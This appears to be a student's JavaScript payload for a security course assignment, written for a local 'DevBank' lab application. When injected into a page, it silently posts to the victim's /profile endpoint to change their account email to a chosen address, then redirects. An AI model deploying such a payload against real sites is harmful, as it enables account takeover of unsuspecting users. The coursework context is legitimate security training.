// FIT5003 Assignment 2 B.2 external JavaScript payload
// Student ID: 35120002
// Demonstrates impact only against the local DevBank lab.

fetch("/profile", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: new URLSearchParams({
    email: "b2-proof-35120002@devbank.local",
    password: "",
  }),
}).then(() => {
  window.location.href = "/profile";
});
